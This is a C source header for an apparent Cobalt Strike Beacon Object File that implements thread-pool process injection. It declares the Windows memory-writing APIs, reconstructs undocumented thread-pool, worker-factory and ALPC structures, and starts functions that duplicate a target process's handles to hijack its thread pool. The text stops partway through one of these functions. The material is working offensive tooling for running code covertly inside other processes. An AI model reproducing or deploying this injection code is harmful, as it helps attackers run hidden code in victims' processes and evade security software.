#pragma once

#include <windows.h>
#include <stdint.h>
#include <stdio.h>
#include <winternl.h>

#include "../_include/beacon.h"

#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
#define STATUS_INFO_LENGTH_MISMATCH ((NTSTATUS)0xC0000004L)
#define WORKER_FACTORY_RELEASE_WORKER 0x0001
#define WORKER_FACTORY_WAIT 0x0002
#define WORKER_FACTORY_SET_INFORMATION 0x0004
#define WORKER_FACTORY_QUERY_INFORMATION 0x0008
#define WORKER_FACTORY_READY_WORKER 0x0010
#define WORKER_FACTORY_SHUTDOWN 0x0020
#define WORKER_FACTORY_ALL_ACCESS ( \
       STANDARD_RIGHTS_REQUIRED | \
       WORKER_FACTORY_RELEASE_WORKER | \
       WORKER_FACTORY_WAIT | \
       WORKER_FACTORY_SET_INFORMATION | \
       WORKER_FACTORY_QUERY_INFORMATION | \
       WORKER_FACTORY_READY_WORKER | \
       WORKER_FACTORY_SHUTDOWN \
)

WINBASEAPI BOOL         WINAPI   KERNEL32$AssignProcessToJobObject(HANDLE hJob, HANDLE hProcess);
WINBASEAPI BOOL         WINAPI   KERNEL32$DuplicateHandle(HANDLE hSourceProcessHandle, HANDLE hSourceHandle, HANDLE hTargetProcessHandle, LPHANDLE lpTargetHandle, DWORD dwDesiredAccess, BOOL bInheritHandle, DWORD dwOptions);
WINBASEAPI BOOL         WINAPI   KERNEL32$ReadProcessMemory(HANDLE, LPCVOID, LPVOID, SIZE_T, SIZE_T);
WINBASEAPI BOOL         WINAPI   KERNEL32$SetEvent(HANDLE);
WINBASEAPI BOOL         WINAPI   KERNEL32$SetInformationJobObject(HANDLE hJob, JOBOBJECTINFOCLASS JobObjectInformationClass, LPVOID lpJobObjectInformation, DWORD cbJobObjectInformationLength);
WINBASEAPI BOOL         WINAPI   KERNEL32$VirtualProtectEx(HANDLE, LPVOID, SIZE_T, DWORD, PDWORD);
WINBASEAPI BOOL         WINAPI   KERNEL32$VirtualProtectEx(HANDLE, LPVOID, SIZE_T, DWORD, PDWORD);
WINBASEAPI BOOL         WINAPI   KERNEL32$WriteFile(HANDLE hFile, LPCVOID lpBuffer, DWORD nNumberOfBytesToWrite, LPDWORD lpNumberOfBytesWritten, LPOVERLAPPED lpOverlapped);
WINBASEAPI BOOL         WINAPI   KERNEL32$WriteProcessMemory(HANDLE hProcess, LPVOID lpBaseAddress, LPCVOID lpBuffer, SIZE_T nSize, SIZE_T *lpNumberOfBytesWritten);
WINBASEAPI HANDLE       WINAPI   KERNEL32$CloseHandle(HANDLE);
WINBASEAPI HANDLE       WINAPI   KERNEL32$CreateEventW(LPSECURITY_ATTRIBUTES, BOOL, BOOL, LPCWSTR);
WINBASEAPI HANDLE       WINAPI   KERNEL32$CreateFileW(LPCWSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile);
WINBASEAPI HANDLE       WINAPI   KERNEL32$CreateJobObjectA(LPSECURITY_ATTRIBUTES lpJobAttributes, LPCSTR lpName);
WINBASEAPI HANDLE       WINAPI   KERNEL32$GetCurrentProcess (VOID);
WINBASEAPI HANDLE       WINAPI   KERNEL32$OpenProcess (DWORD dwDesiredAccess, WINBOOL bInheritHandle, DWORD dwProcessId);
WINBASEAPI LPVOID       WINAPI   KERNEL32$VirtualAllocEx(HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
WINBASEAPI PTP_IO       WINAPI   KERNEL32$CreateThreadpoolIo( HANDLE fl, PTP_WIN32_IO_CALLBACK pfnio, PVOID pv, PTP_CALLBACK_ENVIRON pcbe);
WINBASEAPI PTP_TIMER    WINAPI   KERNEL32$CreateThreadpoolTimer( PTP_TIMER_CALLBACK pfnti, PVOID pv, PTP_CALLBACK_ENVIRON pcbe);
WINBASEAPI PTP_WAIT     WINAPI   KERNEL32$CreateThreadpoolWait(PTP_WAIT_CALLBACK pfnwa, PVOID pv, PTP_CALLBACK_ENVIRON pcbe);
WINBASEAPI PTP_WORK     WINAPI   KERNEL32$CreateThreadpoolWork(PTP_WORK_CALLBACK, PVOID, PTP_CALLBACK_ENVIRON);

WINBASEAPI int          WINAPI   MSVCRT$rand(void);
WINBASEAPI time_t       WINAPI   MSVCRT$time(time_t *seconds);
WINBASEAPI void         WINAPI   MSVCRT$srand(unsigned int seed);
WINBASEAPI void*        WINAPI   MSVCRT$calloc(size_t number, size_t size);
WINBASEAPI void*        WINAPI   MSVCRT$malloc(size_t size);

WINBASEAPI wchar_t     *__cdecl  MSVCRT$wcscmp(const wchar_t *_lhs,const wchar_t *_rhs);
WINBASEAPI errno_t      __cdecl  MSVCRT$wcscat_s(wchar_t *_Dst, rsize_t _DstSize, const wchar_t *_Src);
WINBASEAPI errno_t      __cdecl  MSVCRT$wcscpy_s(wchar_t *_Dst, rsize_t _DstSize, const wchar_t *_Src);
WINBASEAPI void        *__cdecl  MSVCRT$realloc(void *_Memory, size_t _NewSize);
WINBASEAPI size_t       __cdecl  MSVCRT$wcslen(const wchar_t *_Str);

// Structs

typedef struct _TP_TASK_CALLBACKS
{
    void* ExecuteCallback;
    void* Unposted;
} TP_TASK_CALLBACKS, * PTP_TASK_CALLBACKS;

typedef struct _TP_TASK
{
    struct _TP_TASK_CALLBACKS* Callbacks;
    UINT32 NumaNode;
    UINT8 IdealProcessor;
    char Padding_242[3];
    struct _LIST_ENTRY ListEntry;
} TP_TASK, * PTP_TASK;

typedef struct _TPP_REFCOUNT
{
    volatile INT32 Refcount;
} TPP_REFCOUNT, * PTPP_REFCOUNT;

typedef struct _TPP_CALLER
{
    void* ReturnAddress;
} TPP_CALLER, * PTPP_CALLER;

typedef struct _TPP_PH
{
    struct _TPP_PH_LINKS* Root;
} TPP_PH, * PTPP_PH;

typedef struct _TP_DIRECT
{
    struct _TP_TASK Task;
    UINT64 Lock;
    struct _LIST_ENTRY IoCompletionInformationList;
    void* Callback;
    UINT32 NumaNode;
    UINT8 IdealProcessor;
    char __PADDING__[3];
} TP_DIRECT, * PTP_DIRECT;

typedef struct _TPP_TIMER_SUBQUEUE
{
    INT64 Expiration;
    struct _TPP_PH WindowStart;
    struct _TPP_PH WindowEnd;
    void* Timer;
    void* TimerPkt;
    struct _TP_DIRECT Direct;
    UINT32 ExpirationWindow;
    INT32 __PADDING__[1];
} TPP_TIMER_SUBQUEUE, * PTPP_TIMER_SUBQUEUE;

typedef struct _TPP_TIMER_QUEUE
{
    struct _RTL_SRWLOCK Lock;
    struct _TPP_TIMER_SUBQUEUE AbsoluteQueue;
    struct _TPP_TIMER_SUBQUEUE RelativeQueue;
    INT32 AllocatedTimerCount;
    INT32 __PADDING__[1];
} TPP_TIMER_QUEUE, * PTPP_TIMER_QUEUE;

typedef struct _TPP_NUMA_NODE
{
    INT32 WorkerCount;
} TPP_NUMA_NODE, * PTPP_NUMA_NODE;

typedef union _TPP_POOL_QUEUE_STATE
{
    union
    {
        INT64 Exchange;
        struct
        {
            INT32 RunningThreadGoal : 16;
            UINT32 PendingReleaseCount : 16;
            UINT32 QueueLength;
        };
    };
} TPP_POOL_QUEUE_STATE, * PTPP_POOL_QUEUE_STATE;

typedef struct _TPP_QUEUE
{
    struct _LIST_ENTRY Queue;
    struct _RTL_SRWLOCK Lock;
} TPP_QUEUE, * PTPP_QUEUE;

typedef struct _FULL_TP_POOL
{
    struct _TPP_REFCOUNT Refcount;
    long Padding_239;
    union _TPP_POOL_QUEUE_STATE QueueState;
    struct _TPP_QUEUE* TaskQueue[3];
    struct _TPP_NUMA_NODE* NumaNode;
    struct _GROUP_AFFINITY* ProximityInfo;
    void* WorkerFactory;
    void* CompletionPort;
    struct _RTL_SRWLOCK Lock;
    struct _LIST_ENTRY PoolObjectList;
    struct _LIST_ENTRY WorkerList;
    struct _TPP_TIMER_QUEUE TimerQueue;
    struct _RTL_SRWLOCK ShutdownLock;
    UINT8 ShutdownInitiated;
    UINT8 Released;
    UINT16 PoolFlags;
    long Padding_240;
    struct _LIST_ENTRY PoolLinks;
    struct _TPP_CALLER AllocCaller;
    struct _TPP_CALLER ReleaseCaller;
    volatile INT32 AvailableWorkerCount;
    volatile INT32 LongRunningWorkerCount;
    UINT32 LastProcCount;
    volatile INT32 NodeStatus;
    volatile INT32 BindingCount;
    UINT32 CallbackChecksDisabled : 1;
    UINT32 TrimTarget : 11;
    UINT32 TrimmedThrdCount : 11;
    UINT32 SelectedCpuSetCount;
    long Padding_241;
    struct _RTL_CONDITION_VARIABLE TrimComplete;
    struct _LIST_ENTRY TrimmedWorkerList;
} FULL_TP_POOL, * PFULL_TP_POOL;

typedef struct _ALPC_WORK_ON_BEHALF_TICKET
{
    UINT32 ThreadId;
    UINT32 ThreadCreationTimeLow;
} ALPC_WORK_ON_BEHALF_TICKET, * PALPC_WORK_ON_BEHALF_TICKET;

typedef union _TPP_WORK_STATE
{
    union
    {
        INT32 Exchange;
        UINT32 Insertable : 1;
        UINT32 PendingCallbackCount : 31;
    };
} TPP_WORK_STATE, * PTPP_WORK_STATE;

typedef struct _TPP_ITE_WAITER
{
    struct _TPP_ITE_WAITER* Next;
    void* ThreadId;
} TPP_ITE_WAITER, * PTPP_ITE_WAITER;

typedef struct _TPP_PH_LINKS
{
    struct _LIST_ENTRY Siblings;
    struct _LIST_ENTRY Children;
    INT64 Key;
} TPP_PH_LINKS, * PTPP_PH_LINKS;

typedef struct _TPP_ITE
{
    struct _TPP_ITE_WAITER* First;
} TPP_ITE, * PTPP_ITE;

typedef union _TPP_FLAGS_COUNT
{
    union
    {
        UINT64 Count : 60;
        UINT64 Flags : 4;
        INT64 Data;
    };
} TPP_FLAGS_COUNT, * PTPP_FLAGS_COUNT;

typedef struct _TPP_BARRIER
{
    volatile union _TPP_FLAGS_COUNT Ptr;
    struct _RTL_SRWLOCK WaitLock;
    struct _TPP_ITE WaitList;
} TPP_BARRIER, * PTPP_BARRIER;

typedef struct _TP_CLEANUP_GROUP
{
    struct _TPP_REFCOUNT Refcount;
    INT32 Released;
    struct _RTL_SRWLOCK MemberLock;
    struct _LIST_ENTRY MemberList;
    struct _TPP_BARRIER Barrier;
    struct _RTL_SRWLOCK CleanupLock;
    struct _LIST_ENTRY CleanupList;
} TP_CLEANUP_GROUP, * PTP_CLEANUP_GROUP;


typedef struct _TPP_CLEANUP_GROUP_MEMBER
{
    struct _TPP_REFCOUNT Refcount;
    long Padding_233;
    const struct _TPP_CLEANUP_GROUP_MEMBER_VFUNCS* VFuncs;
    struct _TP_CLEANUP_GROUP* CleanupGroup;
    void* CleanupGroupCancelCallback;
    void* FinalizationCallback;
    struct _LIST_ENTRY CleanupGroupMemberLinks;
    struct _TPP_BARRIER CallbackBarrier;
    union
    {
        void* Callback;
        void* WorkCallback;
        void* SimpleCallback;
        void* TimerCallback;
        void* WaitCallback;
        void* IoCallback;
        void* AlpcCallback;
        void* AlpcCallbackEx;
        void* JobCallback;
    };
    void* Context;
    struct _ACTIVATION_CONTEXT* ActivationContext;
    void* SubProcessTag;
    struct _GUID ActivityId;
    struct _ALPC_WORK_ON_BEHALF_TICKET WorkOnBehalfTicket;
    void* RaceDll;
    FULL_TP_POOL* Pool;
    struct _LIST_ENTRY PoolObjectLinks;
    union
    {
        volatile INT32 Flags;
        UINT32 LongFunction : 1;
        UINT32 Persistent : 1;
        UINT32 UnusedPublic : 14;
        UINT32 Released : 1;
        UINT32 CleanupGroupReleased : 1;
        UINT32 InCleanupGroupCleanupList : 1;
        UINT32 UnusedPrivate : 13;
    };
    long Padding_234;
    struct _TPP_CALLER AllocCaller;
    struct _TPP_CALLER ReleaseCaller;
    enum _TP_CALLBACK_PRIORITY CallbackPriority;
    INT32 __PADDING__[1];
} TPP_CLEANUP_GROUP_MEMBER, * PTPP_CLEANUP_GROUP_MEMBER;

typedef struct _FULL_TP_WORK
{
    struct _TPP_CLEANUP_GROUP_MEMBER CleanupGroupMember;
    struct _TP_TASK Task;
    volatile union _TPP_WORK_STATE WorkState;
    INT32 __PADDING__[1];
} FULL_TP_WORK, * PFULL_TP_WORK;

typedef struct _FULL_TP_TIMER
{
    struct _FULL_TP_WORK Work;
    struct _RTL_SRWLOCK Lock;
    union
    {
        struct _TPP_PH_LINKS WindowEndLinks;
        struct _LIST_ENTRY ExpirationLinks;
    };
    struct _TPP_PH_LINKS WindowStartLinks;
    INT64 DueTime;
    struct _TPP_ITE Ite;
    UINT32 Window;
    UINT32 Period;
    UINT8 Inserted;
    UINT8 WaitTimer;
    union
    {
        UINT8 TimerStatus;
        UINT8 InQueue : 1;
        UINT8 Absolute : 1;
        UINT8 Cancelled : 1;
    };
    UINT8 BlockInsert;
    INT32 __PADDING__[1];
} FULL_TP_TIMER, * PFULL_TP_TIMER;

typedef struct _FULL_TP_WAIT
{
    struct _FULL_TP_TIMER Timer;
    void* Handle;
    void* WaitPkt;
    void* NextWaitHandle;
    union _LARGE_INTEGER NextWaitTimeout;
    struct _TP_DIRECT Direct;
    union
    {
        union
        {
            UINT8 AllFlags;
            UINT8 NextWaitActive : 1;
            UINT8 NextTimeoutActive : 1;
            UINT8 CallbackCounted : 1;
            UINT8 Spare : 5;
        };
    } WaitFlags;
    char __PADDING__[7];
} FULL_TP_WAIT, * PFULL_TP_WAIT;

typedef struct _FULL_TP_IO
{
    struct _TPP_CLEANUP_GROUP_MEMBER CleanupGroupMember;
    struct _TP_DIRECT Direct;
    void* File;
    volatile INT32 PendingIrpCount;
    INT32 __PADDING__[1];
} FULL_TP_IO, * PFULL_TP_IO;

typedef struct _FULL_TP_ALPC
{
    struct _TP_DIRECT Direct;
    struct _TPP_CLEANUP_GROUP_MEMBER CleanupGroupMember;
    void* AlpcPort;
    INT32 DeferredSendCount;
    INT32 LastConcurrencyCount;
    union
    {
        UINT32 Flags;
        UINT32 ExTypeCallback : 1;
        UINT32 CompletionListRegistered : 1;
        UINT32 Reserved : 30;
    };
    INT32 __PADDING__[1];
} FULL_TP_ALPC, * PFULL_TP_ALPC;

typedef struct _T2_SET_PARAMETERS_V0
{
    ULONG Version;
    ULONG Reserved;
    LONGLONG NoWakeTolerance;
} T2_SET_PARAMETERS, * PT2_SET_PARAMETERS;


typedef struct _PROCESS_HANDLE_TABLE_ENTRY_INFO
{
    HANDLE HandleValue;
    ULONG_PTR HandleCount;
    ULONG_PTR PointerCount;
    ACCESS_MASK GrantedAccess;
    ULONG ObjectTypeIndex;
    ULONG HandleAttributes;
    ULONG Reserved;
} PROCESS_HANDLE_TABLE_ENTRY_INFO, * PPROCESS_HANDLE_TABLE_ENTRY_INFO;

typedef struct _PROCESS_HANDLE_SNAPSHOT_INFORMATION
{
    ULONG_PTR NumberOfHandles;
    ULONG_PTR Reserved;
    PROCESS_HANDLE_TABLE_ENTRY_INFO Handles[ANYSIZE_ARRAY];
} PROCESS_HANDLE_SNAPSHOT_INFORMATION, * PPROCESS_HANDLE_SNAPSHOT_INFORMATION;

typedef enum
{
    ProcessHandleInformation = 51
} PROCESS_INFOCLASS;


typedef struct _WORKER_FACTORY_BASIC_INFORMATION
{
    LARGE_INTEGER Timeout;
    LARGE_INTEGER RetryTimeout;
    LARGE_INTEGER IdleTimeout;
    BOOLEAN Paused;
    BOOLEAN TimerSet;
    BOOLEAN QueuedToExWorker;
    BOOLEAN MayCreate;
    BOOLEAN CreateInProgress;
    BOOLEAN InsertedIntoQueue;
    BOOLEAN Shutdown;
    ULONG BindingCount;
    ULONG ThreadMinimum;
    ULONG ThreadMaximum;
    ULONG PendingWorkerCount;
    ULONG WaitingWorkerCount;
    ULONG TotalWorkerCount;
    ULONG ReleaseCount;
    LONGLONG InfiniteWaitGoal;
    PVOID StartRoutine;
    PVOID StartParameter;
    HANDLE ProcessId;
    SIZE_T StackReserve;
    SIZE_T StackCommit;
    NTSTATUS LastThreadCreationStatus;
} WORKER_FACTORY_BASIC_INFORMATION, * PWORKER_FACTORY_BASIC_INFORMATION;


typedef NTSTATUS(NTAPI* _NtSetTimer2)(
    HANDLE TimerHandle,
    PLARGE_INTEGER DueTime,
    PLARGE_INTEGER Period,
    PT2_SET_PARAMETERS Parameters
    );

typedef NTSTATUS(NTAPI* _NtQueryInformationProcess)(
    IN HANDLE ProcessHandle,
    IN PROCESSINFOCLASS ProcessInformationClass,
    OUT PVOID ProcessInformation,
    IN ULONG ProcessInformationLength,
    OUT PULONG ReturnLength OPTIONAL
    );


typedef NTSTATUS(NTAPI* _NtQueryObject)(
    HANDLE Handle,
    OBJECT_INFORMATION_CLASS ObjectInformationClass,
    PVOID ObjectInformation,
    ULONG ObjectInformationLength,
    PULONG ReturnLength
    );

typedef enum _QUERY_WORKERFACTORYINFOCLASS
{
    WorkerFactoryBasicInformation = 7,
} QUERY_WORKERFACTORYINFOCLASS, * PQUERY_WORKERFACTORYINFOCLASS;

typedef NTSTATUS(NTAPI* _NtQueryInformationWorkerFactory)(
    HANDLE WorkerFactoryHandle,
    QUERY_WORKERFACTORYINFOCLASS WorkerFactoryInformationClass,
    PVOID WorkerFactoryInformation,
    ULONG WorkerFactoryInformationLength,
    PULONG ReturnLength
    );

typedef NTSTATUS(NTAPI* _ZwSetIoCompletion)(
    HANDLE IoCompletionHandle,
    PVOID KeyContext,
    PVOID ApcContext,
    NTSTATUS IoStatus,
    ULONG_PTR IoStatusInformation
    );

typedef struct _FULL_TP_JOB
{
    struct _TP_DIRECT Direct;
    struct _TPP_CLEANUP_GROUP_MEMBER CleanupGroupMember;
    void* JobHandle;
    union
    {
        volatile int64_t CompletionState;
        int64_t Rundown : 1;
        int64_t CompletionCount : 63;
    };
    struct _RTL_SRWLOCK RundownLock;
} FULL_TP_JOB, * PFULL_TP_JOB;

typedef NTSTATUS(NTAPI* _TpAllocJobNotification)(
    PFULL_TP_JOB* JobReturn,
    HANDLE HJob,
    PVOID Callback,
    PVOID Context,
    PTP_CALLBACK_ENVIRON CallbackEnviron
    );

typedef NTSTATUS(NTAPI* _NtWriteVirtualMemory) (
    HANDLE ProcessHandle,
    PVOID BaseAddress,
    PVOID Buffer,
    SIZE_T BytesToWrite,
    PSIZE_T BytesWritten
    );

typedef struct _ALPC_PORT_ATTRIBUTES
{
    ULONG Flags;
    SECURITY_QUALITY_OF_SERVICE SecurityQos;
    SIZE_T MaxMessageLength;
    SIZE_T MemoryBandwidth;
    SIZE_T MaxPoolUsage;
    SIZE_T MaxSectionSize;
    SIZE_T MaxViewSize;
    SIZE_T MaxTotalSectionSize;
    ULONG DupObjectTypes;
#ifdef _WIN64
    ULONG Reserved;
#endif
} ALPC_PORT_ATTRIBUTES, * PALPC_PORT_ATTRIBUTES;


typedef NTSTATUS(NTAPI* _NtAlpcCreatePort)(
    PHANDLE PortHandle,
    POBJECT_ATTRIBUTES ObjectAttributes,
    PALPC_PORT_ATTRIBUTES PortAttributes
    );

typedef struct _TP_ALPC TP_ALPC, * PTP_ALPC;

typedef VOID(NTAPI* PTP_ALPC_CALLBACK)(
    PTP_CALLBACK_INSTANCE Instance,
    PVOID Context,
    PTP_ALPC Alpc
    );

typedef NTSTATUS(NTAPI* _TpAllocAlpcCompletion)(
    PFULL_TP_ALPC* AlpcReturn,
    HANDLE AlpcPort,
    PTP_ALPC_CALLBACK Callback,
    PVOID Context,
    PTP_CALLBACK_ENVIRON CallbackEnviron
    );

typedef struct _ALPC_PORT_ASSOCIATE_COMPLETION_PORT
{
    PVOID CompletionKey;
    HANDLE CompletionPort;
} ALPC_PORT_ASSOCIATE_COMPLETION_PORT, * PALPC_PORT_ASSOCIATE_COMPLETION_PORT;

// private
typedef enum _ALPC_PORT_INFORMATION_CLASS
{
    AlpcBasicInformation, // q: out ALPC_BASIC_INFORMATION
    AlpcPortInformation, // s: in ALPC_PORT_ATTRIBUTES
    AlpcAssociateCompletionPortInformation, // s: in ALPC_PORT_ASSOCIATE_COMPLETION_PORT
    AlpcConnectedSIDInformation, // q: in SID
    AlpcServerInformation, // q: inout ALPC_SERVER_INFORMATION
    AlpcMessageZoneInformation, // s: in ALPC_PORT_MESSAGE_ZONE_INFORMATION
    AlpcRegisterCompletionListInformation, // s: in ALPC_PORT_COMPLETION_LIST_INFORMATION
    AlpcUnregisterCompletionListInformation, // s: VOID
    AlpcAdjustCompletionListConcurrencyCountInformation, // s: in ULONG
    AlpcRegisterCallbackInformation, // s: ALPC_REGISTER_CALLBACK // kernel-mode only
    AlpcCompletionListRundownInformation, // s: VOID // 10
    AlpcWaitForPortReferences,
    AlpcServerSessionInformation // q: ALPC_SERVER_SESSION_INFORMATION // since 19H2
} ALPC_PORT_INFORMATION_CLASS;


typedef NTSTATUS(NTAPI* _NtAlpcSetInformation)(
    HANDLE PortHandle,
    ALPC_PORT_INFORMATION_CLASS PortInformationClass,
    PVOID PortInformation,
    ULONG Length
    );

typedef struct _PORT_MESSAGE
{
    union
    {
        struct
        {
            USHORT DataLength;
            USHORT TotalLength;
        } s1;
        ULONG Length;
    } u1;
    union
    {
        struct
        {
            USHORT Type;
            USHORT DataInfoOffset;
        } s2;
        ULONG ZeroInit;
    } u2;
    union
    {
        CLIENT_ID ClientId;
        double DoNotUseThisField;
    };
    ULONG MessageId;
    union
    {
        SIZE_T ClientViewSize; // only valid for LPC_CONNECTION_REQUEST messages
        ULONG CallbackId; // only valid for LPC_REQUEST messages
    };
} PORT_MESSAGE, * PPORT_MESSAGE;
typedef struct _ALPC_MESSAGE {
    PORT_MESSAGE PortHeader;
    BYTE PortMessage[1000];
} ALPC_MESSAGE, * PALPC_MESSAGE;

typedef struct _ALPC_MESSAGE_ATTRIBUTES
{
    ULONG AllocatedAttributes;
    ULONG ValidAttributes;
} ALPC_MESSAGE_ATTRIBUTES, * PALPC_MESSAGE_ATTRIBUTES;

typedef NTSTATUS(NTAPI* _NtAlpcConnectPort)(
    PHANDLE PortHandle,
    PUNICODE_STRING PortName,
    POBJECT_ATTRIBUTES ObjectAttributes,
    PALPC_PORT_ATTRIBUTES PortAttributes,
    ULONG Flags,
    PSID RequiredServerSid,
    PPORT_MESSAGE ConnectionMessage,
    PSIZE_T BufferLength,
    PALPC_MESSAGE_ATTRIBUTES OutMessageAttributes,
    PALPC_MESSAGE_ATTRIBUTES InMessageAttributes,
    PLARGE_INTEGER Timeout
    );

typedef struct _FILE_COMPLETION_INFORMATION
{
    HANDLE Port;
    PVOID Key;
} FILE_COMPLETION_INFORMATION, * PFILE_COMPLETION_INFORMATION;

typedef enum _EXTENDED_FILE_INFORMATION_CLASS {
    r_FileDirectoryInformation = 1,
    r_FileFullDirectoryInformation,
    r_FileBothDirectoryInformation,
    r_FileBasicInformation,
    r_FileStandardInformation,
    r_FileInternalInformation,
    r_FileEaInformation,
    r_FileAccessInformation,
    r_FileNameInformation,
    r_FileRenameInformation,
    r_FileLinkInformation,
    r_FileNamesInformation,
    r_FileDispositionInformation,
    r_FilePositionInformation,
    r_FileFullEaInformation,
    r_FileModeInformation,
    r_FileAlignmentInformation,
    r_FileAllInformation,
    r_FileAllocationInformation,
    r_FileEndOfFileInformation,
    r_FileAlternateNameInformation,
    r_FileStreamInformation,
    r_FilePipeInformation,
    r_FilePipeLocalInformation,
    r_FilePipeRemoteInformation,
    r_FileMailslotQueryInformation,
    r_FileMailslotSetInformation,
    r_FileCompressionInformation,
    r_FileObjectIdInformation,
    r_FileCompletionInformation,
    r_FileMoveClusterInformation,
    r_FileQuotaInformation,
    r_FileReparsePointInformation,
    r_FileNetworkOpenInformation,
    r_FileAttributeTagInformation,
    r_FileTrackingInformation,
    r_FileIdBothDirectoryInformation,
    r_FileIdFullDirectoryInformation,
    r_FileValidDataLengthInformation,
    r_FileShortNameInformation,
    r_FileIoCompletionNotificationInformation,
    r_FileIoStatusBlockRangeInformation,
    r_FileIoPriorityHintInformation,
    r_FileSfioReserveInformation,
    r_FileSfioVolumeInformation,
    r_FileHardLinkInformation,
    r_FileProcessIdsUsingFileInformation,
    r_FileNormalizedNameInformation,
    r_FileNetworkPhysicalNameInformation,
    r_FileIdGlobalTxDirectoryInformation,
    r_FileIsRemoteDeviceInformation,
    r_FileUnusedInformation,
    r_FileNumaNodeInformation,
    r_FileStandardLinkInformation,
    r_FileRemoteProtocolInformation,
    r_FileRenameInformationBypassAccessCheck,
    r_FileLinkInformationBypassAccessCheck,
    r_FileVolumeNameInformation,
    r_FileIdInformation,
    r_FileIdExtdDirectoryInformation,
    r_FileReplaceCompletionInformation,
    r_FileHardLinkFullIdInformation,
    r_FileIdExtdBothDirectoryInformation,
    r_FileDispositionInformationEx,
    r_FileRenameInformationEx,
    r_FileRenameInformationExBypassAccessCheck,
    r_FileDesiredStorageClassInformation,
    r_FileStatInformation,
    r_FileMemoryPartitionInformation,
    r_FileStatLxInformation,
    r_FileCaseSensitiveInformation,
    r_FileLinkInformationEx,
    r_FileLinkInformationExBypassAccessCheck,
    r_FileStorageReserveIdInformation,
    r_FileCaseSensitiveInformationForceAccessCheck,
    r_FileKnownFolderInformation,
    r_FileStatBasicInformation,
    r_FileId64ExtdDirectoryInformation,
    r_FileId64ExtdBothDirectoryInformation,
    r_FileIdAllExtdDirectoryInformation,
    r_FileIdAllExtdBothDirectoryInformation,
    r_FileMaximumInformation
 } EXTENDED_FILE_INFORMATION_CLASS, *PEXTENDED_FILE_INFORMATION_CLASS;

typedef NTSTATUS(NTAPI* _NtSetInformationFile)(
    HANDLE FileHandle,
    PIO_STATUS_BLOCK IoStatusBlock,
    PVOID FileInformation,
    ULONG Length,
    FILE_INFORMATION_CLASS FileInformationClass
    );

BYTE* NtQueryObject_(HANDLE x, OBJECT_INFORMATION_CLASS y) {
    _NtQueryObject NtQueryObject = (_NtQueryObject)(GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtQueryObject"));
    ULONG InformationLength = 0;
    NTSTATUS Ntstatus = STATUS_INFO_LENGTH_MISMATCH;
    BYTE* Information = NULL;

    do {
        Information = (BYTE*)MSVCRT$realloc(Information, InformationLength);
        Ntstatus = NtQueryObject(x, y, Information, InformationLength, &InformationLength);
    } while (STATUS_INFO_LENGTH_MISMATCH == Ntstatus);

    return Information;
}

typedef enum _SET_WORKERFACTORYINFOCLASS
{
    WorkerFactoryTimeout = 0,
    WorkerFactoryRetryTimeout = 1,
    WorkerFactoryIdleTimeout = 2,
    WorkerFactoryBindingCount = 3,
    WorkerFactoryThreadMinimum = 4,
    WorkerFactoryThreadMaximum = 5,
    WorkerFactoryPaused = 6,
    WorkerFactoryAdjustThreadGoal = 8,
    WorkerFactoryCallbackType = 9,
    WorkerFactoryStackInformation = 10,
    WorkerFactoryThreadBasePriority = 11,
    WorkerFactoryTimeoutWaiters = 12,
    WorkerFactoryFlags = 13,
    WorkerFactoryThreadSoftMaximum = 14,
    WorkerFactoryMaxInfoClass = 15 /* Not implemented */
} SET_WORKERFACTORYINFOCLASS, * PSET_WORKERFACTORYINFOCLASS;

typedef NTSTATUS(NTAPI* _NtSetInformationWorkerFactory)(
    HANDLE hTpWorkerFactory,
    SET_WORKERFACTORYINFOCLASS WorkerFactoryInformationClass,
    PVOID WorkerFactoryInformation,
    ULONG WorkerFactoryInformationLength
    );

typedef NTSTATUS(NTAPI* _ZwAssociateWaitCompletionPacket)(
    HANDLE WaitCopmletionPacketHandle,
    HANDLE IoCompletionHandle,
    HANDLE TargetObjectHandle,
    PVOID KeyContext,
    PVOID ApcContext,
    NTSTATUS IoStatus,
    ULONG_PTR IoStatusInformation,
    PBOOLEAN AlreadySignaled
    );

// ----------------------------------------------------------------------------------------------------

// Functions

HANDLE hIoCompletion = NULL;
HANDLE hTpWorkerFactory = NULL;
HANDLE hIRTimer = NULL;

HANDLE HijackProcessHandle(PWSTR wsObjectType, HANDLE p_hTarget, DWORD dwDesiredAccess) {
    _NtQueryInformationProcess NtQueryInformationProcess = (_NtQueryInformationProcess)(GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtQueryInformationProcess"));

    BYTE* Information = NULL;
    ULONG InformationLength = 0;
    NTSTATUS Ntstatus = STATUS_INFO_LENGTH_MISMATCH;

    do {
        Information = (BYTE*)MSVCRT$realloc(Information, InformationLength);
        Ntstatus = NtQueryInformationProcess(p_hTarget, (PROCESSINFOCLASS)(ProcessHandleInformation), Information, InformationLength, &InformationLength);
    } while (STATUS_INFO_LENGTH_MISMATCH == Ntstatus);


    PPROCESS_HANDLE_SNAPSHOT_INFORMATION pProcessHandleInformation = (PPROCESS_HANDLE_SNAPSHOT_INFORMATION)(Information);

    HANDLE p_hDuplicatedObject;
    ULONG InformationLength_ = 0;

    for (int i = 0; i < pProcessHandleInformation->NumberOfHandles; i++) {
        KERNEL32$DuplicateHandle(
            p_hTarget,
            pProcessHandleInformation->Handles[i].HandleValue,
            KERNEL32$GetCurrentProcess(),
            &p_hDuplicatedObject,
            dwDesiredAccess,
            FALSE,
            (DWORD_PTR)NULL);

        BYTE* pObjectInformation;
        pObjectInformation = NtQueryObject_(p_hDuplicatedObject, ObjectTypeInformation);
        PPUBLIC_OBJECT_TYPE_INFORMATION pObjectTypeInformation = (PPUBLIC_OBJECT_TYPE_INFORMATION)(pObjectInformation);

        if (MSVCRT$wcscmp(wsObjectType, pObjectTypeInformation->TypeName.Buffer) != 0) {
            continue;
        }

        return p_hDuplicatedObject;
    }
}

HANDLE HijackTargetThreadPoolHandle(PWSTR wsObjectType, HANDLE processHandle, DWORD dwDesiredAccess) {
    return HijackProcessHandle(wsObjectType, processHandle, dwDesiredAccess);
}

HANDLE GetTargetThreadPoolHandle(PWSTR wsObjectType, HANDLE processHandle, DWORD dwDesiredAccess) {
    HANDLE hTargetThreadPoolHandle = HijackTargetThreadPoolHandle(wsObjectType, processHandle, dwDesiredAccess);
